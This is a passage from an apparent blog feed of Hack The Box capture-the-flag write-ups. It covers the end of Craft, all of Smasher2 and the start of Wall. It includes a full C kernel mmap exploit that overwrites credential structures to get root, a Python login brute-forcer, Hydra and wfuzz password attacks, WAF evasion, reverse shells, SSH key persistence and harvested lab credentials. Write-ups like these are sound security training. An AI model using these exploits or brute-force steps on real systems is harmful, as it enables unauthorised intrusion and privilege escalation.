...connect to [10.10.14.2] from (UNKNOWN) [10.10.10.110] 43065/bin/sh: can't access tty; job control turned off/opt/app # iduid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm).../opt/app #Turns out this is just a container and I need to keep looking to get a shell on the host OS.Finding more credentials in MySQLThe settings.py file contains the MySQL credentials and the shared api key./opt/app/craft_api # cat settings.py# Flask settingsFLASK_SERVER_NAME = 'api.craft.htb'FLASK_DEBUG = False  # Do not use debug mode in production# Flask-Restplus settingsRESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'RESTPLUS_VALIDATE = TrueRESTPLUS_MASK_SWAGGER = FalseRESTPLUS_ERROR_404_HELP = FalseCRAFT_API_SECRET = 'hz66OCkDtv8G6D'# databaseMYSQL_DATABASE_USER = 'craft'MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'MYSQL_DATABASE_DB = 'craft'MYSQL_DATABASE_HOST = 'db'SQLALCHEMY_TRACK_MODIFICATIONS = FalseThe MySQL client is not installed on this machine but I can use the pymysql Python module to query the database./opt/app # python -c 'import pty;pty.spawn(\"/bin/sh\")'/opt/app # pythonPython 3.6.8 (default, Feb  6 2019, 01:56:13) [GCC 8.2.0] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import pymysql&gt;&gt;&gt; connection = pymysql.connect(host='172.20.0.4', user='craft', password='qLGockJ6G2J75O',    db='craft', cursorclass=pymysql.cursors.DictCursor)&gt;&gt;&gt; cursor = connection.cursor()&gt;&gt;&gt; cursor.execute(\"show tables\")2&gt;&gt;&gt; cursor.fetchall()[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]&gt;&gt;&gt; cursor.execute(\"select * from user\")3&gt;&gt;&gt; cursor.fetchall()                   [{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]So I found a few more credentials:  ebachman / llJ77D8QFkLPQB  gilfoyle / ZEU3N8WNM2rh4TI can log in to the Gogs website with Gilfoyle’s credentials:Gilfoyle has a private repo: craft-infra and I find Gilfoyle’s SSH private and public keys in the .ssh directory:I can now log in as user gilfoyle with the SSH key (the SSH key password is ZEU3N8WNM2rh4T):# ssh -i id_rsa gilfoyle@10.10.10.110  .   *   ..  . *  **  * @()Ooc()*   o  .    (Q@*0CG*O()  ___   |\\_________/|/ _ \\   |  |  |  |  | / | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | | | |   |  |  |  |  | \\_| |   |  |  |  |  |\\___/   |\\_|__|__|_/|    \\_________/Enter passphrase for key 'id_rsa': Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.gilfoyle@craft:~$ lsuser.txtgilfoyle@craft:~$ cat user.txtbbf4b0ca...PrivescI saw from the craft-infra repo that Vault is installed and I see that Gilfoyle has a vault token in its home directory:gilfoyle@craft:~$ ls -latotal 36drwx------ 4 gilfoyle gilfoyle 4096 Feb  9 22:46 .drwxr-xr-x 3 root     root     4096 Feb  9 10:46 ..-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9 22:41 .bashrcdrwx------ 3 gilfoyle gilfoyle 4096 Feb  9 03:14 .config-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8 21:52 .profiledrwx------ 2 gilfoyle gilfoyle 4096 Feb  9 22:41 .ssh-r-------- 1 gilfoyle gilfoyle   33 Feb  9 22:46 user.txt-rw------- 1 gilfoyle gilfoyle   36 Feb  9 00:26 .vault-token-rw------- 1 gilfoyle gilfoyle 2546 Feb  9 22:38 .viminfogilfoyle@craft:~$ cat .vault-tokenf1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9The secrets.sh config in the repo contains the following:vault write ssh/roles/root_otp \\    key_type=otp \\    default_user=root \\    cidr_list=0.0.0.0/0I can get an OTP user token for root and log in using vault ssh -mode=otp -role=root_otp root@10.10.10.110:"
  },
  
  {
    "title": "Smasher2 - Hack The Box",
    "url": "/posts/htb-writeup-smasher2/",
    "categories": "hackthebox, infosec",
    "tags": "waf, sqli, bruteforce, kernel module, python, re",
    "date": "2019-12-14 00:00:00 +0800",
    





    
    "snippet": "Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fu...",
    "content": "Just its predecessor, Smasher2 is a very difficult box with reverse engineering and binary exploitation. Unfortunately, the initial step required some insane brute-forcing which took part of the fun out of this one for me. I solved the authentication bypass part using an unintended method: The code compares the password against the username instead of the password in the configuration file so by guessing the username I also had the password and could log in. I had to do some WAF evasion to get my payload uploaded and land a shell. Then the final part of the box is exploiting a kernel driver mmap handler to change the credential structure in memory of my current user to get root access.Overcast was the first one to find the intended way to solve the authentication bypass. He posted an excellent writeup about it here and I recommend you check it out: https://www.justinoblak.com/2019/10/01/hack-the-box-smasher2.htmlSummary  We can do a zone transfer to find the wonderfulsessionmanager.smasher2.htb sub-domain.  The domain has a simple generic website with a login form running on Python Flask.  On the main website there’s a /backup directory that is protected by HTTP basic authentication and contains the source code of the web application running on the machine  The unintended way to bypass the authentication of the web app is to review the source code, run the auth.py with the shared library locally and identify that the supplied password is being checked against the username (instead of the password). Then it’s just a matter of bruteforcing usernames until we find that we can log in with Administrator / Administrator and get an API key.  Once we have an API key, we have to defeat a WAF to gain RCE on the system.  After getting a shell, we find a custom kernel module that is vulnerable to memory mapping issues.  Using the discovered vulnerability, we can modify the credentials memory structure of our user and change it so we have root privileges.Blogs used  Kernel Driver mmap Handler ExploitationPortscan# nmap -sC -sV -p- 10.10.10.135Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-04 23:23 EDTNmap scan report for smasher2.htb (10.10.10.135)Host is up (0.023s latency).Not shown: 65532 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)| dns-nsid: |_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 403 ForbiddenService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 80 website enumerationThe web server displays the default Ubuntu apache page:When running gobuster I found an interesting /backup directory but it’s protected by HTTP basic authentication.# gobuster -w raft-large-words-lowercase.txt -t 25 -u http://10.10.10.135 -s 200,204,301,302,307,401/backup (Status: 401)I tried a few different credentials but I wasn’t able to get in.DNS zone transferIn the portscan I saw that DNS was listening so I thought of doing a zone transfer to see if there are any sub-domains/vhosts. I found the wonderfulsessionmanager.smasher2.htb sub-domain by doing a zone transfer:# host -t axfr smasher2.htb 10.10.10.135Trying \"smasher2.htb\"Using domain server:Name: 10.10.10.135Address: 10.10.10.135#53Aliases: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 8130;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;smasher2.htb.\t\t\tIN\tAXFR;; ANSWER SECTION:smasher2.htb.\t\t604800\tIN\tSOA\tsmasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800smasher2.htb.\t\t604800\tIN\tNS\tsmasher2.htb.smasher2.htb.\t\t604800\tIN\tA\t127.0.0.1smasher2.htb.\t\t604800\tIN\tAAAA\t::1smasher2.htb.\t\t604800\tIN\tPTR\twonderfulsessionmanager.smasher2.htb.smasher2.htb.\t\t604800\tIN\tSOA\tsmasher2.htb. root.smasher2.htb. 41 604800 86400 2419200 604800Enumerating wonderfulsessionmanager.smasher2.htbOn the wonderfulsessionmanager.smasher2.htb vhost I found a website for the DZONERZY Session Manager.There’s isn’t much on the site except a login form at /login:I tried a few random default credentials but I wasn’t able to log in. As shown here, the login result comes in a JSON format:Also, there is a session Cookie returned by the server:eyJpZCI6eyIgYiI6IllUUXhaVFk1WlRGbVpXVmhaVEF4WldRNU1HSTBZekUwTlRoaE5UVXlOalprT0RJNFpXUXdNZz09In19.XPcIkQ.R6SdddxAKkm8zMC-SPtaIlO-MGMThat decodes to {\"id\":{\" b\":\"YTQxZTY5ZTFmZWVhZTAxZWQ5MGI0YzE0NThhNTUyNjZkODI4ZWQwMg==\"}} plus the signature.If we had the shared secret key we could probably craft our own arbitrary token but I don’t see anything that would allow us to change privileges, unlike for example JWT tokens with an admin=0 that we can change to admin=1 after bruteforcing the shared secret.Bruteforcing the backup directoryAfter spending some time trying to find a vulnerability on the login page, I went back to the /backup folder I had found on the website with the IP address. I tried a few different wordlists without any luck. Since I didn’t have the username, I had to guess it was either something generic like admin or any of the top usernames, or some combination of the 3 different names on the website:I built a wordlist with the following usernames:adminbackupdevtempbackupAllySandersRobertAndersonJohnMcAffreyasandersrandersonjmcaffreyallysandersrobertandersonjohnmcaffreyandersonrsandersamcaffreyjjohn.mcaffreyrobert.andersonally.sandersUnfortunately not of them worked. By that time, a lot of people in the Mattermost HTB chat were stuck in the same place and the box creator dropped a hint that we had to use the full rockyou.txt wordlist and start at the letter c. He also mentioned that the username was admin. I don’t know how this part of the box got past the HTB testers since heavy bruteforcing is normally not allowed (I think the box later got patched and that basic auth part was removed). To put this into perspective, even when knowing the username and the start letter, we’re looking at potentially ~640k passwords in rockyou.txt:# egrep \"^c.*\" /usr/share/wordlists/rockyou.txt &gt; wordlist.txtroot@ragingunicorn:~/htb/smasher2# wc -l wordlist.txt 639676 wordlist.txtIn my opinion, this is way over the top since the full rockyou list has 14M+ entries and it’s not possible to brute force an HTTP basic auth in a reasonable amount of time when we don’t even know the username. Anyways, it still took me ~40 minutes to find the password when running 32 threads in hydra:# hydra -l admin -P wordlist.txt 10.10.10.135 -t 32 http-get /backupHydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-05 00:24:55[DATA] max 32 tasks per 1 server, overall 32 tasks, 639677 login tries (l:1/p:639677), ~19990 tries per task[DATA] attacking http-get://10.10.10.135:80/backup[STATUS] 7725.00 tries/min, 7725 tries in 00:01h, 631952 to do in 01:22h, 32 active[STATUS] 7830.67 tries/min, 23492 tries in 00:03h, 616185 to do in 01:19h, 32 active[STATUS] 7795.57 tries/min, 54569 tries in 00:07h, 585108 to do in 01:16h, 32 active[STATUS] 7838.53 tries/min, 117578 tries in 00:15h, 522099 to do in 01:07h, 32 active[STATUS] 7856.03 tries/min, 243537 tries in 00:31h, 396140 to do in 00:51h, 32 active[80][http-get] host: 10.10.10.135   login: admin   password: clarabibi1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-05 01:05:21Password: clarabibiI checked if that password was present in any other wordlist from SecLists, including the reduced rockyou list but I didn’t find it there. It’s only in the full rockyou list:# grep -ri clarabibi /usr/share/seclists/root@ragingunicorn:~# grep -ri clarabibi /usr/share/wordlists/rockyou.txt clarabibiOk, rant over.Once I had the password, I checked out the /backup and found the source code for the authentication page on wonderfulsessionmanager.smasher2.htbBypassing the login prompt (unintended method)The auth.py file is a Python Flask application that implements a few endpoints:  /login presents the HTML page for logging in  /auth handles the AJAX request from the login page  /assets serves static content such as images  /api clearly contains an RCE vector through the subprocess function, but it expects a key which is provided after logging inUnfortunately, the username and password have been scrubbed from the source file backup:The code also uses the custom ses module but it’s implemented through the ses.so shared object library so I don’t have an easy python source code to review.# file ses.soses.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,BuildID[sha1]=0c67d40b77854318b10417b4aedfee95a52f0550, not strippedTo load the ses.so file in my Python code, I used the following ses.py snippet of code I found online:def __bootstrap__():   global __bootstrap__, __loader__, __file__   import sys, pkg_resources, imp   __file__ = pkg_resources.resource_filename(__name__,'ses.so')   __loader__ = None; del __bootstrap__, __loader__   imp.load_dynamic(__name__,__file__)__bootstrap__()Then I used a skeleton code to load create a SessionManager object:import sesimport hashlibimport hmacimport base64def craft_secure_token(content):    h = hmac.new(\"HMACSecureKey123!\", base64.b64encode(content).encode(), hashlib.sha256)    return h.hexdigest()login = [\"snowscan\", \"yolo1234\"]s = ses.SessionManager(login, craft_secure_token(\":\".join(login)))I experimented in the interactive interpreter a bit to list the different methods available for this object:&gt;&gt;&gt; s = ses.SessionManager(login, craft_secure_token(\":\".join(login)))&gt;&gt;&gt; dir(s)['__doc__', '__init__', '__module__', 'blocked', 'check_login', 'inc_login_count', 'last_login', 'login_count', 'rst_login_count', 'secret_key', 'time_module', 'user_login']The secret_key property is created by the craft_secure_token function and it contains the API key that needs to be applied to access the /api endpoint:In this case, the key is created by the HMAC of the login and password I put in my skeleton code:def craft_secure_token(content):    h = hmac.new(\"HMACSecureKey123!\", base64.b64encode(content).encode(), hashlib.sha256)    return h.hexdigest()...Managers.update({id: ses.SessionManager(login, craft_secure_token(\":\".join(login)))})&gt;&gt;&gt; s.secret_key'd781058ac21c2d30abc660e1c8d9c91e8f615ff1713a0d496b4153540be796d8'There’s a couple of method and properties to manage login count and lockout, but the most interesting method I checked after was check_login. Based on the auth.py source code, it expects a dictionnary with a data key that contains another dictionnary with both username and password as keys.I tested the check_login function a few times but it always returned a False result even when I put the right credentials:&gt;&gt;&gt; login = [\"snowscan\", \"yolo1234\"]&gt;&gt;&gt; s = ses.SessionManager(login, craft_secure_token(\":\".join(login)))&gt;&gt;&gt; d = { ...     \"data\": {...         \"username\": \"snowscan\",...         \"password\": \"yolo1234\"...     }... }&gt;&gt;&gt; &gt;&gt;&gt; s.check_login(d)[False, {'username': 'snowscan', 'password': 'yolo1234'}]To see what is going on with the module, I started GDB after I launched by Python interactive interpreter and just attached to the Python PID:# ps -ef | grep pythonroot      33226   2076  0 01:04 pts/1    00:00:00 python# gdb -p 33226GNU gdb (Debian 8.2.1-2) 8.2.1I tried checking the functions with info func but since the program is already running, it shows all libc functions and others that are loaded. Way too much stuff displayed… My gdb skills suck so I used Ghidra to check the program functions:Only 4 functions shown for SessionManager:  SessionManager_check_login  SessionManager_init_login_count  SessionManager_init  SessionManager_rst_login_countIn SessionManager_check_login, I can see the code does two strcmp calls to check the username and password:I put a breakpoint in GDB at the SessionManager_check_login function call and traced its execution.First, there’s a strcmp for the username:Then on the next strcmp for the password there’s something really strange…It’s comparing the supplied password against the username. Wow, that’s a pretty bad bug! So if I just brute force the usernames and I find a valid one I will be able to login by using it as the password.To brute force the username, I wrote the script below but had to factor in some error handling whenever I would get a 403 message for some usernames with invalid characters. Sometimes I would also get some false positive, plus the box also dies after ~300 login attempts so I had to reset quite a few times before I figured out the right wordlist.#!/usr/bin/pythonimport requestsimport timeproxies = {    \"http\": \"http://127.0.0.1:8080\"}url = \"http://wonderfulsessionmanager.smasher2.htb/auth\"headers = {    \"Content-Type\": \"application/json\",    \"X-Requested-With\": \"XMLHttpRequest\",}with open(\"userlist3.txt\") as f:    passwords = f.read().splitlines()i = 0bad = 0while True:    bad = 0    s = requests.Session()    r = s.get(\"http://wonderfulsessionmanager.smasher2.htb/login\", proxies=proxies)    if r.status_code != 200:        print(\"GET FAILED!\")        exit(1)    data = '{\"action\":\"auth\",\"data\":{\"username\":\"%s\",\"password\":\"%s\"}}' % (passwords[i], passwords[i])    print(\"Testing username: %s\" % passwords[i])    while True:        r = s.post(url, headers=headers, data=data, proxies=proxies)        if r.status_code == 200:            break        if r.status_code == 403:            bad = bad + 1            if bad == 5:                print(\"Skipping... %s\" % passwords[i])                break    if (not \"Cannot authenticate with data\" in r.text) and (bad &lt; 5):        print(\"Potential password! %s\" % passwords[i])        with open(\"out.txt\", \"a\") as f:            f.write(\"%s\\n\" % passwords[i])    i = i + 1    time.sleep(0.05)Eventually, I found that the username Administrator is the right one (case-sensitive):# python brute.py Testing username: adminTesting username: administratorTesting username: operatorTesting username: sqlTesting username: demoTesting username: posTesting username: userTesting username: defaultTesting username: defaultaccountTesting username: accountTesting username: accountingTesting username: guestTesting username: guestTesting username: admTesting username: officeTesting username: managerTesting username: AdminTesting username: AdministratorPotential password! AdministratorI can now log in and get an API key:WAF evasion then RCEUsing the /api/&lt;key&gt;/job API, I can execute some commands like whoami:However there is a WAF configured because the following commands are blocked and the server returns a 403 Forbidden:  most UNIX commands (ls, cat, etc.)  multiple commands separated with a semi colon (ie. whoami;whoami)  multiple commands separated with an ampersand (ie. whoami&amp;&amp;whoami)  multiple commands separated by spaces  and a bunch of othersInstead of using ls, I can do echo * or echo ../../../../* to use path traversal and walk the entire file system.I was able to find the home directory of user dzonerzy.To read the flag I used the tac command which was not blacklisted. It’s basically the same as cat but lists the content of the file in reverse order.After some experimentation I found that the printf command is allowed and that hex encoded characters are permitted. We’re also allowed to redirect the output to files so I now have a way to write arbitrary data to files without being intercepted by the WAF.So I encoded the following shell script with CyberChef:Then I wrote the script to the server using printf:And made it executable…Then executed it and I finally got a shell# nc -lvnp 4444Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::4444Ncat: Listening on 0.0.0.0:4444Ncat: Connection from 10.10.10.135.Ncat: Connection from 10.10.10.135:51882.iduid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)python -c 'import pty;pty.spawn(\"/bin/bash\")'dzonerzy@smasher2:~/smanager$After getting a shell, I dropped my RSA public key into authorized_keys so I could use a regular SSH session:dzonerzy@smasher2:~$ echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykF...tGPTwuiA5NAcPKPG25jkQln3J8Id2ngappH2jeDg89 root@ragingunicorn\" &gt; .ssh/authorized_keys# ssh dzonerzy@10.10.10.135Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage * 'snap info' now shows the freshness of each channel.   Try 'snap info microk8s' for all the latest goodness.Last login: Fri Feb 15 22:05:15 2019dzonerzy@smasher2:~$ iduid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)Root privescAfter searching for a while I found a custom kernel module here:  ./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.koThis is clearly the target since the box creator’s name is the module info:$ modinfo ./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.kofilename:       /lib/./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.koversion:        1.0description:    LKM for dzonerzy dhid devicesauthor:         DZONERZYlicense:        GPLsrcversion:     974D0512693168483CADFE9depends:        retpoline:      Yname:           dhidvermagic:       4.15.0-45-generic SMP mod_unloadWe can see that the module has already been loaded:dzonerzy@smasher2:/lib$ lsmod | grep dhiddhid                   16384  0dzonerzy@smasher2:/lib$ dmesg | grep dhid[   10.110988] dhid: loading out-of-tree module taints kernel.[   10.111020] dhid: module verification failed: signature and/or required key missing - tainting kerneldzonerzy@smasher2:/lib$ ls -l /dev/dhidcrwxrwxrwx 1 root root 243, 0 Jun  6 01:09 /dev/dhidI am not very familiar with the way Linux kernel modules work so I had to google a bit. I noticed that there is dev_read function but no dev_write function, so it’s unlikely we have to do some kind of buffer overflow.The dev_read function seems to return only a simple string, it doesn’t do anything else.To test this, I used the program below that just opens a file description on the dhid device and read from it.#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;errno.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt; #define BUFFER_LENGTH 256 // The buffer length (crude but fine)static char receive[BUFFER_LENGTH]; // The receive buffer from the LKM int main() {    int ret, fd;    fd = open(\"/dev/dhid\", O_RDWR); // Open the device with read/write access    if (fd &lt; 0){        perror(\"Failed to open the device...\");        return errno;    }    ret = read(fd, receive, BUFFER_LENGTH); // Read the response from the LKM    if (ret &lt; 0){        perror(\"Failed to read the message from the device.\");        return errno;    }    printf(\"The received message is: [%s]\\n\", receive);    printf(\"End of the program\\n\");    return 0;}As expected, it returns the string and simply exits:dzonerzy@smasher2:/dev/shm$ gcc -o test test.cdzonerzy@smasher2:/dev/shm$ ./testThe received message is: [This is the right way, please exploit this shit!]End of the programThere’s an interesting paper from MWR Lab about Kernel Driver mmap Handler Exploitation that apply to the custom kernel module here.The gist of it is if the mmap handler in the module doesn’t perform proper validation of parameters then we can map all the physical memory of the system from a program then read/write kernel memory from user space. This allows an attacker to read sensitive data and/or change credential structures. In this case, I want to change the privileges of the dzonerzy user to become root.The decompiled code for dev_mmap right next to the whitepaper code example:The whitepaper contains an exploit code that search the memory space for credential structures then modify it to give root access.#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;errno.h&gt;#include &lt;sys/mman.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;#include &lt;pthread.h&gt;int main(int argc, char * const * argv){\tprintf(\"[+] PID: %d\\n\", getpid());\tint fd = open(\"/dev/dhid\", O_RDWR);\tif (fd &lt; 0)\t{\t\tprintf(\"[-] Open failed!\\n\");\t\treturn -1;\t}\tprintf(\"[+] Open OK fd: %d\\n\", fd);\tunsigned long size = 0xf0000000;\tunsigned long mmapStart = 0x42424000;\tunsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);\tif (addr == MAP_FAILED)\t{\t\tperror(\"Failed to mmap: \");\t\tclose(fd);\t\treturn -1;\t}\tprintf(\"[+] mmap OK addr: %lx\\n\", addr);\t\tunsigned int uid = getuid();\tprintf(\"[+] UID: %d\\n\", uid);\tunsigned int credIt = 0;\tunsigned int credNum = 0;\twhile (((unsigned long)addr) &lt; (mmapStart + size - 0x40))\t{\t\tcredIt = 0;\t\tif (\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid &amp;&amp;\t\taddr[credIt++] == uid\t\t)\t\t{\t\t\tcredNum++;\t\t\tprintf(\"[+] Found cred structure! ptr: %p, credNum: %d\\n\", addr, credNum);\t\t\tcredIt = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\taddr[credIt++] = 0;\t\t\tif (getuid() == 0)\t\t\t{\t\t\t\tputs(\"[+] GOT ROOT!\");\t\t\t\tcredIt += 1; //Skip 4 bytes, to get capabilities\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\taddr[credIt++] = 0xffffffff;\t\t\t\texecl(\"/bin/sh\", \"-\", (char *)NULL);\t\t\t\tputs(\"[-] Execl failed...\");\t\t\t\tbreak;\t\t\t}\t\t\telse\t\t\t{\t\t\t\tcredIt = 0;\t\t\t\taddr[credIt++] = uid;\t\t\t\taddr[credIt++] = uid;\t\t\t\taddr[credIt++] = uid;\t\t\t\taddr[credIt++] = uid;\t\t\t\taddr[credIt++] = uid;\t\t\t\taddr[credIt++] = uid;\t\t\t\taddr[credIt++] = uid;\t\t\t}\t\t}\t\taddr++;\t}\tputs(\"[+] Scanning loop END\");\tfflush(stdout);\t\tint stop = getchar();\treturn 0;}After compiling and running the code, we get root access:dzonerzy@smasher2:/dev/shm$ gcc -w -o exploit exploit.cdzonerzy@smasher2:/dev/shm$ ./exploit[+] PID: 15475[+] Open OK fd: 3[+] mmap OK addr: 42424000[+] UID: 1000[+] Found cred structure! ptr: 0x763600c4, credNum: 1[+] Found cred structure! ptr: 0x76360544, credNum: 2[+] Found cred structure! ptr: 0x76360cc4, credNum: 3[+] Found cred structure! ptr: 0x76361444, credNum: 4[+] Found cred structure! ptr: 0x76361b04, credNum: 5[+] Found cred structure! ptr: 0x76361bc4, credNum: 6[+] Found cred structure! ptr: 0x76361e04, credNum: 7[+] Found cred structure! ptr: 0x76c4af04, credNum: 8[+] GOT ROOT!# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)# cat /root/root.txt7791e0..."
  },
  
  {
    "title": "Wall - Hack The Box",
    "url": "/posts/htb-writeup-wall/",
    "categories": "hackthebox, infosec",
    "tags": "linux, centreon, screen, waf, centreon, CVE-2019-13024",
    "date": "2019-12-07 00:00:00 +0800",
    





    
    "snippet": "Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it’s not some...",
    "content": "Wall is running a vulnerable version of the Centreon application that allows authenticated users to gain RCE. The tricky part of this box was finding the path to the application since it’s not something that normally shows up in the wordlists I use with gobuster. The intended way was to bypass the HTTP basic auth by using a POST then the redirection contained a link to the centreon page but instead I did some recon on the box creator’s website and saw that he had written an exploit for Centreon and guessed the path accordingly. The priv esc was the same used on Flujab: a vulnerability in screen that allows the attacker to write to any file on the system.Summary  There’s a Centreon application running that is vulnerable to CVE-2019-13024  We can guess or bruteforce the password and then execute the exploit  The exploit needs to be modified because there is a WAF configured on the server  Once we get a shell, we find a version of screen that is vulnerable to a root privesc exploitTools, Exploits &amp; Blogs used  POC for Centreon v19.04 Remote Code Execution CVE-2019-13024  GNU Screen 4.5.0 - Local Privilege EscalationPortscan# nmap -sC -sV -p- 10.10.10.157Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-06 11:54 ESTNmap scan report for 10.10.10.157Host is up (0.027s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.93 secondsWebsite enumerationThe webserver has the default page for Ubuntu.Maybe we need to use wall.htb as vhost but I get the same page when I put that in my /etc/hosts. There might be other vhosts that I need to fuzz but for now I’ll start with gobuster to find interesting files.# gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -x php -b 403,404 -u http://10.10.10.157/aa.php (Status: 200)/monitoring (Status: 401)/panel.php (Status: 200)Both PHP files don’t appear to contain anything interesting:The /monitoring URI requires HTTP basic authentication:Enumeration failsHere’s a list of various things I tried next but didn’t return anything useful:  Brute force the /monitoring page with hydra using admin as username and partial rockyou wordlist  Fuzzing possible parameters on the aa.php and panel.php page  Fuzzing vhosts for FUZZ.wall.htb and FUZZ.htb  Fuzzing different User-Agent headers in HTTP request  Ran Nikto to look for things I might have missed  Ran gobuster again with a long list of extensions and multiple wordlistsI did however notice that when I send a POST request with nc, hostname or passwd in the payload I get a 403 so this indicates there is probably a WAF running on this machine.ReconI checked out the box creator’s github repo and I found a couple of exploits he wrote for various software.There’s a Centreon exploit on his site so I tried /centreon and was able to get a valid page:After I finished the box I went back and tried to find the intended way and found that a POST request is not authenticated and I can see the redirection link:There’s a CSRF token on the login page so it’ll make brute forcing a bit more complicated:I ran gobuster against the /centreon page and I found an API directory:# gobuster dir -q -w /opt/SecLists/Discovery/Web-Content/big.txt -b 403,404 -u http://10.10.10.157/centreon/Themes (Status: 301)/api (Status: 301)/class (Status: 301)Exploiting CentreonAccording to the Centreon’s API documentation, we can can log in with the following:The login API seems to work:# curl -XPOST -d 'username=user&amp;password=pass' 10.10.10.157/centreon/api/index.php?action=authenticate\"Bad credentials\"Next, I’ll use wfuzz with a wordlist to bruteforce a valid login:# wfuzz -w /opt/SecLists/Passwords/Leaked-Databases/rockyou-10.txt --hs 'Bad credentials' -XPOST -d 'username=admin&amp;password=FUZZ' http://10.10.10.157/centreon/api/index.php?action=authenticate********************************************************* Wfuzz 2.4 - The Web Fuzzer                           